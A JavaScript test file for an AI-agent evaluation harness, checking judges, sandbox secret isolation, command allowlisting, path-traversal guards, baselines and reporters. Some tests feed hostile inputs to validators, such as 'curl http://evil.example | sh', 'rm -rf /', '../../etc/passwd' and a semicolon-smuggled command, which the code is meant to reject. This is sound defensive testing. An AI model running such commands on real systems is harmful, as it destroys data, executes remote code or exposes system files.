const test = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const os = require("os");
const path = require("path");

const { parseMarkdownAST } = require("../tools/eval/lib/ast");
const { computeRQSD } = require("../tools/eval/lib/biomarkers");
const { validateBenchmarkCommand, runCommandWithTimeout } = require("../tools/eval/lib/process");
const { createSandbox } = require("../tools/eval/sandbox");
const { evaluateTier0 } = require("../tools/eval/tier0-judge");
const { evaluateTier1 } = require("../tools/eval/tier1-judge");
const { loadBaseline, recordBaseline, diffAgainstBaseline } = require("../tools/eval/baseline");
const { resolveAdapter, loadAgentSystemPrompt } = require("../tools/eval/adapters");
const { executeBenchmark, runEvaluation, generateExecutionResponse, resolveGitSha } = require("../tools/eval/runner");
const { renderConsoleReport } = require("../tools/eval/reporters/console-reporter");
const { renderMarkdownReport } = require("../tools/eval/reporters/markdown-reporter");

// --- Review 04 §6.1: trap echo deleted — mock traps go RED, not green ---

test("Review04 - canned mock trap carries no verdict/keywords (echo deleted)", async () => {
  const out = await generateExecutionResponse(
    { id: "TRAP-X", isAdversarialTrap: true, expectedVerdict: "NO-GO", expectedFlawKeywords: ["plaintext", "bcrypt"] },
    { mock: true }, null
  );
  assert.ok(String(out).startsWith("[MOCK]"));
  assert.ok(!/\[(NO-GO|KILL)\]/i.test(out), "must not echo the answer-key verdict");
  assert.ok(!/bcrypt/i.test(out), "must not echo the answer-key flaw keywords");
  const t0 = await evaluateTier0(
    { id: "TRAP-X", isAdversarialTrap: true, expectedVerdict: "NO-GO", expectedFlawKeywords: ["kw"] },
    { output: String(out).replace(/^\[MOCK\] /, "") }
  );
  assert.strictEqual(t0.pass, false, "mock trap output must fail Tier-0 (no free pushback)");
});

// --- Review 04 §3: Tier-1/Tier-0 RegExp guards report suite bugs ---

test("Review04 - invalid Tier-1 rubric patterns fail the criterion, not the process", async () => {
  const res = await evaluateTier1(
    { id: "RX", dimension: "x" },
    { output: "some output" },
    { rubric: { criteria: [{ id: "B", name: "Broken", requiredPatterns: ["([unclosed"] }] } }
  );
  assert.strictEqual(res.pass, false);
  assert.match(res.criteriaResults[0].rationale, /Invalid rubric pattern/);
});

test("Review04 - invalid expectedFlawKeywords is a suite bug, not a model failure", async () => {
  const res = await evaluateTier0(
    { id: "RX", isAdversarialTrap: true, expectedVerdict: "NO-GO", expectedFlawKeywords: ["([unclosed"] },
    { output: "[NO-GO] plaintext violates the invariant." }
  );
  assert.ok(res.failures.some(f => f.includes("Invalid expectedFlawKeywords pattern")));
});

// --- Review 04 §4: adapters fail closed + traversal guard ---

test("Review04 - resolveAdapter throws on unknown adapter names", () => {
  assert.throws(() => resolveAdapter({ adapter: "gpt5" }), /Unknown eval adapter/);
  assert.strictEqual(resolveAdapter({ adapter: "mock" }), null);
});

test("Review04 - persona loader refuses path traversal", () => {
  assert.strictEqual(loadAgentSystemPrompt("../../etc/passwd"), null);
  assert.strictEqual(loadAgentSystemPrompt("@developer; rm -rf"), null);
  assert.strictEqual(loadAgentSystemPrompt("all"), null);
});

// --- Review 04 §4: benchmark command allowlist ---

test("Review04 - benchmark commands are allowlisted, shell metachars rejected", () => {
  assert.doesNotThrow(() => validateBenchmarkCommand("node test.js"));
  assert.doesNotThrow(() => validateBenchmarkCommand("npm test"));
  assert.throws(() => validateBenchmarkCommand("rm -rf /tmp/x"), /not allowlisted/);
  assert.throws(() => validateBenchmarkCommand("node test.js | exfil"), /metacharacter/);
  assert.throws(() => validateBenchmarkCommand("node test.js; rm -rf /"), /metacharacter/);
});

test("Review04 - executionCommand/rejected commands surface as benchmark failures", async () => {
  const res = await executeBenchmark(
    { id: "CMD-01", executionCommand: "curl http://evil.example | sh" },
    { mock: true }
  );
  assert.strictEqual(res.passed, false);
  assert.ok(res.failures.some(f => f.includes("metacharacter") || f.includes("allowlisted")));
});

// --- Review 04 §4: process hardening (timeout 0, output cap) ---

test("Review04 - timeoutMs 0 does not silently become 10s", async () => {
  const start = Date.now();
  const res = await runCommandWithTimeout("node", ["-e", "setTimeout(()=>{},2000)"], { timeoutMs: 0 });
  assert.strictEqual(res.timedOut, true, "0 must clamp to a fast floor, not ||10s");
  assert.ok(Date.now() - start < 1500, "must kill quickly");
});

test("Review04 - unbounded output is truncated and flagged", async () => {
  const res = await runCommandWithTimeout("node", ["-e", "console.log('x'.repeat(3*1024*1024))"], { maxOutputBytes: 1024 });
  assert.strictEqual(res.truncated, true);
  assert.ok(res.stdout.length <= 1024);
});

// --- Review 04 §4: sandbox env allowlist + workspace protection ---

test("Review04 - sandbox env excludes secrets; workspace keys win", async () => {
  process.env.VESPYR_TEST_SECRET_PROBE = "s3cr3t";
  const sandbox = createSandbox({ prefix: "test-review04-env-" });
  try {
    assert.strictEqual(sandbox.env.VESPYR_TEST_SECRET_PROBE, undefined, "secrets must not enter the sandbox");
    assert.ok(sandbox.env.PATH, "PATH must pass through");
    assert.strictEqual(sandbox.env.VESPYR_EVAL_SANDBOX, "1");
    const res = await sandbox.runCommand("node", ["-e", "console.log(process.env.VESPYR_WORKSPACE)"], {
      env: { VESPYR_WORKSPACE: "/evil", VESPYR_TEST_SECRET_PROBE: "s3cr3t", PATH: process.env.PATH }
    });
    assert.ok(!String(res.stdout).includes("/evil"), "runOpts must not override workspace identity");
    assert.ok(!String(res.stdout).includes("s3cr3t"));
  } finally {
    delete process.env.VESPYR_TEST_SECRET_PROBE;
    sandbox.cleanup();
  }
});

test("Review04 - fixture copy refuses symlinks", () => {
  const src = fs.mkdtempSync(path.join(os.tmpdir(), "review04-fixture-"));
  try {
    fs.writeFileSync(path.join(src, "ok.txt"), "ok");
    fs.symlinkSync(path.join(src, "ok.txt"), path.join(src, "link.txt"));
    assert.throws(() => createSandbox({ prefix: "test-review04-link-", fixturePath: src }), /symlink/);
  } finally {
    fs.rmSync(src, { recursive: true, force: true });
  }
});

// --- Review 04 §5: biomarkers N/A instead of vacuous 1.0 ---

test("Review04 - SCR/AC return null (N/A) on unstructured prose; weights renormalize", () => {
  const r = computeRQSD("plain text with no structure at all");
  assert.strictEqual(r.biomarkers.scr, null, "no fence/frontmatter => SCR N/A, not 1.0");
  assert.strictEqual(r.biomarkers.ac_testability, null, "no Gherkin => AC N/A, not 1.0");
  const sum = Object.values(r.weights).reduce((a, b) => a + b, 0);
  assert.ok(Math.abs(sum - 1.0) < 0.001, "remaining weights renormalize to 1.0");
  assert.strictEqual(r.weights.scr, 0);
  assert.strictEqual(r.weights.ac, 0);
});

test("Review04 - malformed JSON fence still fails SCR (applicable, 0.0)", () => {
  const r = computeRQSD("## A\n```json\n{ bad json }\n```\n");
  assert.strictEqual(r.biomarkers.scr, 0.0);
});

// --- Review 04 §5: PCI anchor fallback + placement-aware zero-blueprint ---

test("Review04 - PCI is 0 with code but no decision surface (no false positive)", () => {
  const ast = parseMarkdownAST("Here is a helper:\n```js\nconst x = 1;\n```\nNo verdict here.\n");
  assert.strictEqual(ast.pci, 0.0);
});

test("Review04 - zero-blueprint only breaches on code AFTER the NO-GO line", () => {
  const before = parseMarkdownAST("```js\nconst x = 1;\n```\n## Verdict\n[NO-GO] Bad idea.\n");
  assert.strictEqual(before.violatesZeroBlueprintOnNoGo, false, "pre-verdict deliberation code is not a shipped blueprint");
  const after = parseMarkdownAST("## Verdict\n[NO-GO] Bad idea.\n```js\nconst x = 1;\n```\n");
  assert.strictEqual(after.violatesZeroBlueprintOnNoGo, true);
});

// --- Review 04 §3/§5: token provenance split ---

test("Review04 - provider tokens ride alongside, never mixed into local counts", async () => {
  const { countTokens } = require("../tools/eval/lib/tokenizer");
  const res = await executeBenchmark(
    { id: "TOK-01", dimension: "general" },
    { mock: true, executionAdapter: async () => ({ output: "hello world", tokens: 9999 }) }
  );
  assert.strictEqual(res.providerTokens, 9999);
  assert.strictEqual(res.tokens, countTokens("hello world"), "tokens is always the local count");
  assert.strictEqual(res.tokenSource, "provider+local");
  assert.strictEqual(res.mock, false, "real adapter execution is measured");
});

// --- Review 04 §3: baseline gates (erosion, flips, mismatch, empty) ---

test("Review04 - SCORE_EROSION gates tier-1 decay under pass-rate parity", () => {
  const baseline = { summary: { pass_rate: 1.0, total_token_spend: 1000, tier1_avg_score: 4.5 }, benchmarks: [] };
  const run = { passRate: 1.0, totalTokens: 1000, tier1AvgScore: 3.0, benchmarks: [] };
  const diff = diffAgainstBaseline(run, baseline);
  assert.strictEqual(diff.hasRegression, true);
  assert.ok(diff.regressions.some(r => r.type === "SCORE_EROSION"));
});

test("Review04 - FAIL→PASS flips are recorded as improvements, not regressions", () => {
  const baseline = { summary: { pass_rate: 0.5, total_token_spend: 100 }, benchmarks: [{ id: "B", passed: false }] };
  const run = { passRate: 1.0, totalTokens: 100, tier1AvgScore: 4.0, benchmarks: [{ id: "B", name: "B", passed: true }] };
  const diff = diffAgainstBaseline(run, baseline);
  assert.ok(diff.improvements.some(i => i.type === "BENCHMARK_IMPROVEMENT"));
  assert.ok(!diff.regressions.some(r => r.type === "BENCHMARK_REGRESSION"));
});

test("Review04 - mock-vs-real comparison is a MOCK_MODE_MISMATCH regression", () => {
  const baseline = { mock_mode: false, summary: { pass_rate: 1.0, total_token_spend: 100 }, benchmarks: [] };
  const run = { mockMode: true, passRate: 1.0, totalTokens: 100, benchmarks: [] };
  const diff = diffAgainstBaseline(run, baseline);
  assert.ok(diff.regressions.some(r => r.type === "MOCK_MODE_MISMATCH"));
});

test("Review04 - empty runs score 0, never green 1.0", async () => {
  const res = await runEvaluation({ suite: "no-such-suite-xyz", concurrency: 2, mock: true });
  assert.strictEqual(res.total, 0);
  assert.strictEqual(res.passRate, 0);
  assert.strictEqual(res.tier1AvgScore, null);
});

test("Review04 - CLI exits 3 on empty runs (config error, not green)", () => {
  const { spawnSync } = require("child_process");
  const res = spawnSync(process.execPath, ["bin/vespyr-eval.js", "run", "--mock", "--suite", "no-such-suite-xyz"], { encoding: "utf8" });
  assert.strictEqual(res.status, 3, `stdout: ${res.stdout}\nstderr: ${res.stderr}`);
});

test("Review04 - corrupt baseline fails closed (throws, never treated as fresh)", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "review04-base-"));
  const file = path.join(dir, "baseline.json");
  fs.writeFileSync(file, "{ not json");
  try {
    assert.throws(() => loadBaseline(file), /corrupt/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("Review04 - recordBaseline pins provenance + version and keeps a backup", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "review04-rec-"));
  const file = path.join(dir, "baseline.json");
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "package.json"), "utf8"));
    const first = recordBaseline(
      { total: 1, passed: 1, failed: 0, passRate: 1.0, tier0PassRate: 1.0, tier1AvgScore: 4.0, totalTokens: 10, provenance: { adapter: "mock" }, benchmarks: [] },
      file
    );
    assert.strictEqual(first.harness_version, pkg.version, "harness version tracks package.json");
    assert.strictEqual(first.provenance.adapter, "mock", "caller provenance preserved");
    assert.ok(first.provenance.dataset_hash, "dataset hash pinned for cross-run validity");
    assert.ok(first.provenance.judge, "judge identity pinned");
    assert.ok("seed" in first.provenance, "seed pinned (null when unset)");
    recordBaseline(
      { total: 1, passed: 0, failed: 1, passRate: 0, tier0PassRate: 0, tier1AvgScore: 2.0, totalTokens: 12, benchmarks: [] },
      file
    );
    assert.ok(fs.existsSync(file + ".prev.json"), "displaced baseline is recoverable");
    const prev = JSON.parse(fs.readFileSync(file + ".prev.json", "utf8"));
    assert.strictEqual(prev.summary.pass_rate, 1.0);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// --- Review 04 §5: reporters survive malformed input ---

test("Review04 - reporters render malformed runs as N/A instead of throwing", () => {
  const malformed = {
    total: 1, passed: 0, failed: 1, passRate: null, tier0PassRate: undefined,
    tier1AvgScore: NaN, totalTokens: null, latencyP50: 0, latencyP95: 0,
    dimensions: { research_grounding: { measured: true, score: null, pass_rate: null, hallucination_rate: null } },
    benchmarks: [{ id: "B|1\ninjected", agent: null, skill: null, suite: "s", dimension: "general", passed: false, tier0Passed: false, tier1Score: null, tokens: null }]
  };
  const consoleOut = renderConsoleReport(malformed);
  assert.ok(consoleOut.includes("N/A"));
  assert.ok(!consoleOut.includes("injected\n"), "newlines must not break the table");
  const mdOut = renderMarkdownReport(malformed);
  assert.ok(mdOut.includes("N/A"));
  assert.ok(!mdOut.includes("B|1"), "pipes must be escaped in markdown tables");
});

// --- Residuals batch (review 04 §9): held-out rubrics + overlap ---

test("Residuals - inline held-out rubric judges instead of the dimension default", async () => {
  const { evaluateTier1 } = require("../tools/eval/tier1-judge");
  const res = await evaluateTier1(
    { id: "H1", dimension: "prd_completeness", rubric: { criteria: [{ id: "C", name: "Custom", requiredPatterns: ["bespoke-marker-xyz"] }] } },
    { output: "output with bespoke-marker-xyz present" }
  );
  assert.strictEqual(res.pass, true);
  assert.strictEqual(res.rubricSource, "held-out-inline");
  assert.strictEqual(res.tier1Overlap, null, "held-out rubric has no assertContains to overlap");
});

test("Residuals - rubricFile traversal and missing files fail closed", async () => {
  const { evaluateTier1 } = require("../tools/eval/tier1-judge");
  for (const bad of ["../../package.json", "/etc/passwd", "no-such-rubric-xyz.json"]) {
    const res = await evaluateTier1({ id: "H2", dimension: "x", rubricFile: bad }, { output: "anything" });
    assert.strictEqual(res.pass, false, bad);
    assert.strictEqual(res.score, 1.0, bad);
    assert.strictEqual(res.rubricSource, "held-out-file", bad);
  }
});

test("Residuals - co-authorship overlap flags shared Tier-0/Tier-1 vocabulary", async () => {
  const { evaluateTier1, coauthorshipOverlap } = require("../tools/eval/tier1-judge");
  const rubric = { criteria: [{ id: "C", name: "Has Section", requiredPatterns: ["Problem Statement", "ZZZ-UNRELATED"] }] };
  // Same strings in assertContains => overlap 0.5 => co-authored.
  const shared = await evaluateTier1(
    { id: "H3", dimension: "x", assertContains: ["Problem Statement"] },
    { output: "## Problem Statement\nZZZ-UNRELATED\n" },
    { rubric }
  );
  assert.strictEqual(shared.tier1Overlap, 0.5);
  assert.strictEqual(shared.tier1Coauthored, true);
  assert.strictEqual(shared.rubricSource, "override");
  // Disjoint vocabulary => overlap 0 => independent.
  const disjoint = await evaluateTier1(
    { id: "H4", dimension: "x", assertContains: ["something-else-entirely"] },
    { output: "## Problem Statement\nZZZ-UNRELATED\n" },
    { rubric }
  );
  assert.strictEqual(disjoint.tier1Overlap, 0);
  assert.strictEqual(disjoint.tier1Coauthored, false);
  // No requiredPatterns anywhere => null (nothing to overlap).
  assert.strictEqual(coauthorshipOverlap({ id: "H5" }, { criteria: [{ id: "W", name: "Thorough", minWordCount: 5 }] }).fraction, null);
});

test("Residuals - run summary reports Tier-1 independence counts", async () => {
  const res = await runEvaluation({ suite: "invariants/intent-routing", concurrency: 2, mock: true });
  assert.ok(res.tier1Independence, "summary carries independence block");
  assert.ok(res.tier1Independence.evaluated >= 0);
  assert.ok(Array.isArray(res.tier1Independence.coauthored_ids));
});

// --- Residuals batch: --min-rqsd global floor ---

test("Residuals - global minRQSD floor enforces RQS-D without benchmark contract", async () => {
  const thin = { id: "RQ-G", dimension: "general", mockOutput: "plain unstructured text" };
  const floored = await executeBenchmark(thin, { mock: true, tier0Only: true, minRQSD: 0.85 });
  assert.strictEqual(floored.passed, false, "global floor must gate thin output");
  assert.ok(floored.failures.some(f => f.includes("RQS-D")), "failure names the RQS-D gate");
  const unfloored = await executeBenchmark(thin, { mock: true, tier0Only: true });
  assert.ok(!unfloored.failures.some(f => f.includes("RQS-D")), "no floor, no gate (default unchanged)");
});

test("Residuals - explicit requireRQSD:false opts out of the global floor", async () => {
  const thin = { id: "RQ-O", dimension: "general", mockOutput: "plain unstructured text", requireRQSD: false };
  const res = await executeBenchmark(thin, { mock: true, tier0Only: true, minRQSD: 0.85 });
  assert.ok(!res.failures.some(f => f.includes("RQS-D")), "explicit benchmark opt-out wins");
});

test("Residuals - CLI parses --min-rqsd and rejects out-of-range values", () => {
  const { parseArgs } = require("../bin/vespyr-eval.js");
  assert.strictEqual(parseArgs(["run", "--min-rqsd", "0.7"]).minRQSD, 0.7);
  assert.strictEqual(parseArgs(["run"]).minRQSD, null);
});

// --- Residuals batch: requiredSteps → measured script_fidelity ---

test("Residuals - requiredSteps missing steps fail Tier-0 with a measured metric", async () => {
  const res = await evaluateTier0(
    { id: "ST-01", requiredSteps: ["Step 1: Spec", "Step 2: Implement", "Step 9: Launch"] },
    { output: "Step 1: Spec done.\nStep 2: Implement done.\n" }
  );
  assert.strictEqual(res.pass, false);
  assert.deepStrictEqual(res.metrics.script_steps, { matched: 2, total: 3 });
  assert.ok(res.failures.some(f => f.includes("Missing required plan steps (2/3)")));
  const full = await evaluateTier0(
    { id: "ST-02", requiredSteps: ["Step 1: Spec", "Step 2: Implement"] },
    { output: "Step 1: Spec done.\nStep 2: Implement done.\n" }
  );
  assert.strictEqual(full.pass, true);
  assert.deepStrictEqual(full.metrics.script_steps, { matched: 2, total: 2 });
});

// --- Residuals batch: git SHA probe never throws ---

test("Residuals - resolveGitSha returns a hex string or null, never throws", () => {
  const sha = resolveGitSha();
  assert.ok(sha === null || (/^[0-9a-f]{4,40}$/i.test(sha)), `unexpected sha: ${sha}`);
});

// --- Residuals batch: mock/measured split aggregates ---

test("Residuals - all-mock runs report the full count under mocked", async () => {
  const res = await runEvaluation({ suite: "invariants/intent-routing", concurrency: 2, mock: true });
  assert.strictEqual(res.split.mocked.count, res.total);
  assert.strictEqual(res.split.measured.count, 0);
  assert.strictEqual(res.split.mocked.pass_rate, res.passRate);
});

test("Residuals - mixed runs split fixture-recall from real execution", async () => {
  // One measured benchmark (executionCommand) + one mock benchmark.
  const { executeBenchmark: exec } = require("../tools/eval/runner");
  const measured = await exec({ id: "MX-01", executionCommand: "node --version" }, { mock: true });
  const mocked = await exec({ id: "MX-02", mockOutput: "canned" }, { mock: true });
  assert.strictEqual(measured.mock, false, "sandboxed command output is measured");
  assert.strictEqual(mocked.mock, true);
});

// --- Held-out candidates (review 04 §10): decoupling invariant ---

test("Held-out candidates - same scoring math, disjoint evidence vocabulary", () => {
  const { loadRubricFile, loadRubric, coauthorshipOverlap } = require("../tools/eval/tier1-judge");
  const pairs = [
    { file: "prd-completeness.heldout-01.json", dim: "prd_completeness", suiteFile: "agents/core-swarm.json", ids: ["AGENT-PM-01"] },
    { file: "a11y-design.heldout-01.json", dim: "a11y_design", suiteFile: "agents/core-swarm.json", ids: ["AGENT-DESIGNER-01"] },
    { file: "memory-adherence.heldout-01.json", dim: "memory_adherence", suiteFile: "agents/memory-controller.json", ids: ["AGENT-MEMORY-01"] },
    { file: "memory-adherence.heldout-01.json", dim: "memory_adherence", suiteFile: "skills/operations.json", ids: ["SKILL-RETRO"] },
    { file: "sycophantic-premature-convergence.heldout-01.json", dim: "sycophantic_premature_convergence", suiteFile: "skills/discovery.json", ids: ["SKILL-VALIDATE-IDEA"] },
  ];
  for (const p of pairs) {
    const held = loadRubricFile(p.file);
    assert.ok(held && !held.__parseError, `${p.file} loads`);
    assert.strictEqual(held.held_out_candidate, true, `${p.file} marked candidate`);
    assert.strictEqual(held.review_status, "UNREVIEWED", `${p.file} not yet blind-reviewed`);
    assert.strictEqual(held.dimension, p.dim, `${p.file} judges the same dimension`);
    const def = loadRubric(p.dim);
    // Comparability: identical scoring math (ids/weights/threshold), only
    // the requiredPatterns evidence differs. A gap then means vocabulary
    // dependence, not a different test.
    assert.strictEqual(held.passThreshold, def.passThreshold, `${p.file} same threshold`);
    assert.deepStrictEqual(held.criteria.map(c => [c.id, c.weight || 1]), def.criteria.map(c => [c.id, c.weight || 1]), `${p.file} same criteria/weights`);
    const suite = require(`../evals/suites/${p.suiteFile}`);
    for (const id of p.ids) {
      const bm = suite.benchmarks.find(b => b.id === id);
      assert.ok(bm, `${id} exists`);
      assert.strictEqual(coauthorshipOverlap(bm, held).fraction, 0, `${id} shares no vocabulary with ${p.file}`);
    }
  }
});
